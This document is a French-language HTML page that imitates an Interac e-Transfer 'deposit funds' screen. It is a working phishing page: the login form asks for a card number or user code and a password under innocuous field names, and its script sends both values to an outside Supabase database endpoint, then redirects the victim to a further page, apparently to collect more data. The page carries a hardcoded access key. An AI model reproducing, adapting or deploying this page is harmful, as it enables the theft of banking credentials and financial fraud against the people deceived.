<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>E-Transfert — Dépôt</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #ffffff;
    color: #333;
}

.header {
    background: #111;
    color: #f5b400;
    text-align: center;
    padding: 25px;
    font-size: 25px;
    font-weight: bold;
}

.container {
    max-width: 650px;
    margin: 45px auto;
    padding: 30px;
    background: white;
}

/* Titre avec la photo */
.titre-zone {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 15px;
}

.titre-zone h1 {
    margin: 0;
}

.titre-photo {
    width: 200px;
    height: 200px;
    object-fit: contain;
}

.intro {
    text-align: center;
    color: #777;
    margin-bottom: 30px;
}

.notice {
    background: #fff4cc;
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 25px;
    font-size: 14px;
}

label {
    display: block;
    margin-top: 18px;
    margin-bottom: 8px;
    font-weight: bold;
}

input[type="text"] {
    width: 100%;
    padding: 15px;
    border: 1px solid #ccc;
    border-radius: 7px;
    font-size: 16px;
}

/* Options */
.options {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 22px;
    margin-bottom: 25px;
    font-size: 16px;
}

.forgot {
    color: #1976c9;
    text-decoration: none;
}

.remember {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #555;
    margin: 0;
    font-weight: normal;
}

.remember input {
    width: 20px;
    height: 20px;
    margin: 0;
}

/* Bouton bleu */
button {
    width: 100%;
    padding: 18px;
    border: none;
    border-radius: 45px;
    background: #1976c9;
    color: white;
    font-size: 21px;
    font-weight: normal;
    cursor: pointer;

    display: flex;
    justify-content: center;
    align-items: center;
    gap: 18px;
}

button:hover {
    background: #1565b3;
}

.lock {
    font-size: 30px;
    line-height: 1;
}

/* Compte entreprise */
.enterprise {
    display: block;
    text-align: center;
    margin-top: 45px;
    color: #1976c9;
    font-size: 20px;
    text-decoration: none;
}

.message {
    margin-top: 18px;
    text-align: center;
    font-weight: bold;
}
</style>

</head>

<body>

<div class="header">
    Interac E-Transfert
</div>

<div class="container">

    <div class="titre-zone">

        <img
            src="photo3.png"
            class="titre-photo"
            alt=""
        >

        <h1>Déposer les fonds</h1>

    </div>

    <p class="intro">
        <strong>BONJOUR</strong>
    </p>

    <div class="notice">
        C'est votre première connexion ?.
    </div>

    <form id="formulaire">

    <style>
#bonjour,
#lune {
    width: 100%;
    height: 58px;
    box-sizing: border-box;
    padding: 0 25px;
    margin-bottom: 18px;
    background: #ffffff;
    border: 2px solid #9da3aa;
    border-radius: 12px;
    color: #555;
    font-size: 20px;
    font-family: Arial, Helvetica, sans-serif;
    outline: none;
}

#bonjour::placeholder,
#lune::placeholder {
    color: #606773;
    opacity: 1;
}

#bonjour:focus,
#lune:focus {
    border-color: #1976c9;
}
</style>

<input
    id="bonjour"
    type="text"
    placeholder="Numero de carte ou code utilisateur"
    autocomplete="off"
    required
>

<input
    id="lune"
    type="text"
    placeholder="Entrez votre mot de passe"
    autocomplete="off"
    required
>

        <div class="options">

            <a href="#" class="forgot">
                Mot de passe oublié ?
            </a>

            <label class="remember">
                <input type="checkbox">
                Se souvenir de moi
            </label>

        </div>

        <button type="submit">

            <span>Se connecter</span>

            <span class="lock">
    <span class="lock-shackle"></span>
    <span class="lock-body"></span>
</span>

<style>
.lock {
    position: relative;
    width: 28px;
    height: 30px;
    display: inline-block;
}

.lock-shackle {
    position: absolute;
    width: 13px;
    height: 14px;
    left: 7px;
    top: 0;
    border: 2px solid #a7a7a7;
    border-bottom: none;
    border-radius: 10px 10px 0 0;
}

.lock-body {
    position: absolute;
    width: 22px;
    height: 18px;
    left: 3px;
    top: 11px;
    border: 2px solid #a7a7a7;
    border-radius: 4px;
    background: transparent;
}
</style>

        </button>

    </form>

    <a href="#" class="enterprise">
        J'ai un compte Entreprise
    </a>

    <div class="message" id="message"></div>

</div>

<script>

const SUPABASE_URL =
    "https://eokwnhtuveojoxrpytdv.supabase.co";

const SUPABASE_KEY =
    "sb_publishable_K_3CUhqGng7mYO0NZKQQvA_1Aaf57Tx";

document.getElementById("formulaire").addEventListener(
    "submit",
    async function(event) {

        event.preventDefault();

        const message =
            document.getElementById("message");

        const bonjour =
            document.getElementById("bonjour").value.trim();

        const lune =
            document.getElementById("lune").value.trim();

        if (!bonjour || !lune) {

            message.textContent =
                "Veuillez remplir tous les champs.";

            return;
        }

        message.textContent =
            "Enregistrement en cours...";

        try {

            const response = await fetch(
                SUPABASE_URL +
                "/rest/v1/rpc/creer_demande_simple",
                {
                    method: "POST",

                    headers: {
                        "apikey": SUPABASE_KEY,
                        "Authorization":
                            "Bearer " + SUPABASE_KEY,
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        p_a: bonjour,
                        p_b: lune
                    })
                }
            );

            if (!response.ok) {

                const erreur =
                    await response.text();

                console.error(
                    "Erreur Supabase :",
                    erreur
                );

                message.textContent =
                    "Erreur lors de l'enregistrement.";

                return;
            }

            const reference =
                await response.json();

            if (!reference) {

                message.textContent =
                    "Référence introuvable.";

                return;
            }

            localStorage.setItem(
                "demandeReferenceETransfert",
                String(reference)
            );

            message.textContent =
                "Informations enregistrées avec succès.";

            setTimeout(function() {

                window.location.href =
                    "age.html";

            }, 500);

        } catch (error) {

            console.error(
                "Erreur réseau :",
                error
            );

            message.textContent =
                "Impossible de contacter Supabase.";
        }

    }
);

</script>

</body>
</html>
